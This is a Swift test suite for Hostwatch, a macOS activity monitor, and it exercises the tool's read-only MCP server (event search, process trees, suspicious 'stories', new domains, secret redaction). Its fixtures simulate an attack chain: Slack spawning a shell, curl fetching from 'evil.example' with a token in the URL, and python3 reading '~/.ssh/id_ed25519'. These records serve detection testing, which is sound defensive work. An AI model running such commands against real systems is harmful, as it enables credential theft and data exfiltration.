import Foundation
import Testing
@testable import Hostwatch

/// The read-only MCP server, driven with JSON-RPC lines against a fixture data folder.
@Suite(.serialized) struct MCPServerTests {
    let now = Date(timeIntervalSince1970: 1_800_000_000)
    let dir: URL
    let server: MCPServer

    init() throws {
        _ = TestEnv.ready
        let now = Date(timeIntervalSince1970: 1_800_000_000)
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("hostwatch-mcp-\(UUID().uuidString)")
        let history = dir.appendingPathComponent("History")
        try FileManager.default.createDirectory(at: history, withIntermediateDirectories: true)
        let iso = ISO8601DateFormatter()
        iso.formatOptions = [.withInternetDateTime, .withFractionalSeconds]
        func ts(_ minutesAgo: Double) -> String { iso.string(from: now.addingTimeInterval(-minutesAgo * 60)) }
        let events: [[String: Any]] = [
            ["kind": "exec", "pid": 100, "ppid": 1, "name": "Slack", "proc": "/Applications/Slack.app/Contents/MacOS/Slack",
             "target": "/Applications/Slack.app/Contents/MacOS/Slack", "parent": "/sbin/launchd", "args": "", "ts": ts(120)],
            ["kind": "exec", "pid": 200, "ppid": 100, "name": "sh", "proc": "/bin/sh", "target": "/bin/sh",
             "parent": "/Applications/Slack.app/Contents/MacOS/Slack", "args": "sh -c 'curl https://h/x?token=abc123'", "ts": ts(60)],
            ["kind": "exec", "pid": 300, "ppid": 200, "name": "curl", "proc": "/usr/bin/curl", "target": "/usr/bin/curl",
             "parent": "/bin/sh", "args": "curl -s https://evil.example/p", "ts": ts(59)],
            ["kind": "net", "pid": 300, "ppid": 200, "name": "curl", "proc": "/usr/bin/curl", "target": "93.184.216.34:443",
             "extra": "TCP", "host": "evil.example", "host_src": "dns", "ts": ts(58)],
            ["kind": "file", "pid": 400, "ppid": 1, "name": "python3", "proc": "/opt/homebrew/bin/python3",
             "target": FileManager.default.homeDirectoryForCurrentUser.path + "/.ssh/id_ed25519", "extra": "r", "ts": ts(30)],
            ["kind": "exec", "pid": 200, "ppid": 1, "name": "reused", "proc": "/usr/bin/true", "target": "/usr/bin/true",
             "parent": "/sbin/launchd", "args": "", "ts": ts(10)],            // pid 200 reused later
            ["kind": "file", "pid": 500, "ppid": 1, "name": "old", "proc": "/x", "target": "/old", "extra": "r", "ts": ts(3 * 24 * 60)],
        ]
        let lines = try events.map { String(decoding: try JSONSerialization.data(withJSONObject: $0), as: UTF8.self) }
        let historyFile = history.appendingPathComponent("activity-20270112-000000-000.jsonl")
        try (lines.joined(separator: "\n") + "\n").write(to: historyFile, atomically: true, encoding: .utf8)
        // The file was last written "now" on the test clock (the server skips files older than a range).
        try FileManager.default.setAttributes([.modificationDate: now], ofItemAtPath: historyFile.path)
        let enc = JSONEncoder()
        enc.dateEncodingStrategy = .iso8601
        struct Patterns: Encodable { var entries: [SignatureEntry]; var processRules: [SignatureEntry] }
        func entry(_ process: String, _ pattern: String, _ status: SignatureStatus, _ risk: PatternRisk) -> SignatureEntry {
            SignatureEntry(id: "net|\(process)|\(pattern)", kind: .net, process: process, pattern: pattern, count: 7, risk: risk,
                           firstSeen: now, lastSeen: now, status: status, source: status == .unclassified ? nil : "claude",
                           note: nil, exampleName: "x", examplePid: 1, exampleProc: process, exampleTarget: "t",
                           exampleExtra: "TCP", exampleParent: "", exampleHost: nil, exampleHostSource: nil)
        }
        try enc.encode(Patterns(entries: [entry("/usr/bin/curl", "TCP internet:443", .suspicious, .normal),
                                          entry("/opt/homebrew/bin/python3", "TCP internet:443", .unclassified, .high),
                                          entry("/Applications/Slack.app/Contents/MacOS/Slack", "TCP internet:443", .safe, .routine)],
                                processRules: []))
            .write(to: dir.appendingPathComponent("signatures-v2.json"))
        var story = Story(rootPid: 200, originName: "Slack", originPath: "/Applications/Slack.app/Contents/MacOS/Slack", origin: .app)
        let shStart = ActivityEvent(kind: .exec, time: "", pid: 200, ppid: 100, name: "sh", proc: "/bin/sh",
                                    target: "/bin/sh", extra: "", parent: "", args: "sh -c x")
        story.steps = [StoryStep(shStart, stage: .appShell, note: "Slack started sh", date: now)]
        story.fired = true; story.severity = .dangerous; story.lastSeen = now
        try enc.encode([story]).write(to: dir.appendingPathComponent("stories.json"))
        let domains = [DomainRecord(domain: "evil.example", firstSeen: now.addingTimeInterval(-3600), lastSeen: now, count: 1,
                                    programs: ["curl"], hosts: ["evil.example"], baseline: false),
                       DomainRecord(domain: "slack.com", firstSeen: now.addingTimeInterval(-90_000), lastSeen: now, count: 40,
                                    programs: ["Slack"], hosts: ["app.slack.com"], baseline: true)]
        try enc.encode(domains).write(to: dir.appendingPathComponent("domains.json"))
        // Minute process lists for the last 70 minutes: Slack all along; its sh (pid 200) for minutes 60…55 ago.
        let lists = ProcessHistory(directory: history)
        var writer = ProcessHistory.WriterState()
        func proc(_ pid: Int, _ ppid: Int, _ name: String, _ path: String, _ args: String, startMinutesAgo: Double,
                  cpu: Double, mem: Int64, written: Int64) -> RunningProcessInfo {
            RunningProcessInfo(pid: pid, ppid: ppid, start: now.addingTimeInterval(-startMinutesAgo * 60).timeIntervalSince1970,
                               uid: 501, user: "alex", name: name, path: path, args: args, cpu: nil, cpuTime: cpu, mem: mem,
                               threads: 4, written: written)
        }
        for minute in stride(from: 70, through: 0, by: -1) {
            let t = now.addingTimeInterval(-Double(minute) * 60)
            var list = [proc(100, 1, "Slack", "/Applications/Slack.app/Contents/MacOS/Slack", "", startMinutesAgo: 120,
                             cpu: 100 + Double(70 - minute), mem: 300_000_000 + Int64(70 - minute) * 1_000_000,
                             written: Int64(70 - minute) * 2_000_000)]
            if minute <= 60 && minute >= 55 {
                list.append(proc(200, 100, "sh", "/bin/sh", "sh -c 'curl https://h/x?token=abc123'", startMinutesAgo: 60,
                                 cpu: Double(60 - minute) * 0.5, mem: 2_000_000, written: 0))
            }
            let day = MetricsArchive.dayName(t)
            lists.archive.append(line: ProcessHistory.line(for: list, at: t.timeIntervalSince1970, day: day, state: &writer), day: day)
        }
        self.dir = dir
        server = MCPServer(data: MCPDataSource(support: dir, history: history), version: "test", now: { now })
    }

    func call(_ tool: String, _ args: [String: Any] = [:]) throws -> (text: String, isError: Bool) {
        let req = try JSONSerialization.data(withJSONObject: ["jsonrpc": "2.0", "id": 7, "method": "tools/call",
                                                              "params": ["name": tool, "arguments": args]])
        let reply = try #require(server.handle(String(decoding: req, as: UTF8.self)))
        let obj = try #require(try JSONSerialization.jsonObject(with: Data(reply.utf8)) as? [String: Any])
        let result = try #require(obj["result"] as? [String: Any])
        let text = try #require((result["content"] as? [[String: Any]])?.first?["text"] as? String)
        return (text, result["isError"] as? Bool ?? false)
    }

    @Test func compressedHistoryGivesTheSameAnswers() throws {
        let queries: [(String, [String: Any])] = [("search_events", ["query": "curl", "since": "7d"]),
                                                  ("search_events", ["kind": "file", "since": "7d"]),
                                                  ("process_tree", ["pid": 300]),
                                                  ("search_events", ["since": "30m"])]
        let before = try queries.map { try call($0.0, $0.1).text }
        let file = dir.appendingPathComponent("History/activity-20270112-000000-000.jsonl")
        try HistoryFiles.compress(file, blockBytes: 300)               // several tiny blocks
        #expect(!FileManager.default.fileExists(atPath: file.path))
        let after = try queries.map { try call($0.0, $0.1).text }
        #expect(after == before)
    }

    @Test func handshakeAndToolList() throws {
        let initReply = try #require(server.handle(#"{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26"}}"#))
        #expect(initReply.contains(#""protocolVersion":"2025-03-26""#))
        #expect(server.handle(#"{"jsonrpc":"2.0","method":"notifications/initialized"}"#) == nil)
        let list = try #require(server.handle(#"{"jsonrpc":"2.0","id":2,"method":"tools/list"}"#))
        let tools = try #require((try JSONSerialization.jsonObject(with: Data(list.utf8)) as? [String: Any])?["result"] as? [String: Any])
        let defs = try #require(tools["tools"] as? [[String: Any]])
        #expect(defs.count == 11)
        #expect(defs.allSatisfy { (($0["annotations"] as? [String: Any])?["readOnlyHint"] as? Bool) == true })
        // Everything a client loads into its context up front stays small: instructions and the tool list.
        print("MCP context: instructions \(MCPServer.instructions.count) chars, tool list \(list.utf8.count) bytes")
        #expect(MCPServer.instructions.count <= 800)
        #expect(list.utf8.count <= 9_000)
    }

    @Test func protocolErrors() throws {
        #expect(server.handle("not json")?.contains("-32700") == true)
        #expect(server.handle(#"{"jsonrpc":"2.0","id":3,"method":"resources/list"}"#)?.contains("-32601") == true)
        #expect(try call("no_such_tool").isError)
    }

    @Test func searchEventsByTextKindTimeAndMasksSecrets() throws {
        let curl = try call("search_events", ["query": "curl", "since": "24h"])
        #expect(curl.text.contains("curl -s https://evil.example/p"))
        #expect(curl.text.contains("token=[REDACTED]") && !curl.text.contains("abc123"))
        #expect(!curl.text.contains("/old"))                                  // outside the range
        let net = try call("search_events", ["kind": "net"])
        #expect(net.text.contains("evil.example [93.184.216.34:443]"))
        #expect(!net.text.contains("exec "))
        let ssh = try call("search_events", ["query": "~/.ssh"])               // ~ expands
        #expect(ssh.text.contains("python3 (pid 400"))
        let old = try call("search_events", ["since": "7d", "query": "/old"])
        #expect(old.text.contains("/old"))
        #expect(try call("search_events", ["since": "next tuesday"]).isError)
    }

    @Test func patternsStoriesDomains() throws {
        let flagged = try call("search_patterns", ["status": "flagged"]).text
        #expect(flagged.contains("[suspicious/normal]") && !flagged.contains("Slack"))
        #expect(try call("search_patterns", ["risk": "high"]).text.contains("[new/high]"))
        let stories = try call("list_stories").text
        #expect(stories.contains("#1 [dangerous] Slack → sh"))
        #expect(try call("get_story", ["id": "#1"]).text.contains("[App spawned shell]"))
        #expect(try call("get_story", ["id": "9"]).isError)
        let newOnly = try call("list_domains", ["only_new": true]).text
        #expect(newOnly.contains("evil.example  [NEW]") && !newOnly.contains("slack.com"))
    }

    @Test func processTreeRespectsPidReuse() throws {
        let tree = try call("process_tree", ["pid": 300]).text
        #expect(tree.contains("↑ 200  /bin/sh"))            // the sh that really started curl
        #expect(tree.contains("↑ 100  /Applications/Slack.app"))
        #expect(!tree.contains("/usr/bin/true"))            // pid 200 reused later: not an ancestor
        #expect(tree.contains("evil.example"))              // its connection
    }

    /// A history file that was just started (compressed, no finished block yet) is the newest: the search must look
    /// past it, not stop there.
    @Test func aJustStartedHistoryFileDoesNotHideOlderOnes() throws {
        let history = dir.appendingPathComponent("History")
        for ext in ["gz", "blocks"] {
            FileManager.default.createFile(atPath: history.appendingPathComponent("activity-20270115-090000-000.jsonl.\(ext)").path,
                                           contents: Data())
        }
        let found = try call("search_events", ["query": "curl", "since": "2h"])
        #expect(found.text.contains("evil.example"))
        #expect(try call("find_processes", ["query": "curl", "since": "2h"]).text.contains("300  curl"))
    }

    @Test func findProcessesInARange() throws {
        let all = try call("find_processes", ["since": "2h"])
        #expect(!all.isError)
        #expect(all.text.contains("100  Slack (alex, parent 1)") && all.text.contains("still running"))
        #expect(all.text.contains("200  sh") && all.text.contains("last seen"))
        // curl lived under a minute: only its recorded start.
        #expect(all.text.contains("300  curl") && all.text.contains("not in a minute list"))
        #expect(!all.text.contains("abc123"))                              // secrets masked
        let curl = try call("find_processes", ["query": "curl", "since": "2h"])
        #expect(curl.text.contains("300  curl") && !curl.text.contains("100  Slack"))
        let byPid = try call("find_processes", ["query": "100", "since": "2h"])
        #expect(byPid.text.contains("100  Slack") && !byPid.text.contains("300  curl"))
        let earlier = try call("find_processes", ["since": "2h", "until": "65m"])
        #expect(earlier.text.contains("100  Slack") && !earlier.text.contains("200  sh"))
    }

    @Test func traceAProcessAndItsTree() throws {
        let sh = try call("trace_process", ["pid": 200, "at": "58m"])           // the first pid 200: Slack's shell
        #expect(!sh.isError)
        #expect(sh.text.contains("Started by: 100 Slack"))
        #expect(sh.text.contains("Children: 1") && sh.text.contains("↳ 300 curl"))
        #expect(sh.text.contains("hosts: evil.example"))                     // its child's connection
        #expect(sh.text.contains("Resources (") && sh.text.contains("minute lists"))
        #expect(!sh.text.contains("abc123"))
        let alone = try call("trace_process", ["pid": 200, "at": "58m", "children": false])
        #expect(!alone.text.contains("evil.example"))
        let reused = try call("trace_process", ["pid": 200])                    // the latest pid 200: /usr/bin/true
        #expect(reused.text.contains("/usr/bin/true") && !reused.text.contains("↳ 300 curl"))
        #expect(try call("trace_process", ["pid": 99999]).isError)
    }

    @Test func overviewAndSigning() throws {
        let o = try call("hostwatch_overview").text
        #expect(o.contains("Patterns: 3 total") && o.contains("1 new (1 high-risk)") && o.contains("Stories: 1 open"))
        #expect(o.contains("Domains: 2 known · 1 new"))
        let s = try call("signing_info", ["path": "/bin/ls"]).text
        #expect(s.contains("Apple: true") && s.contains("Signature valid: yes"))
    }
}
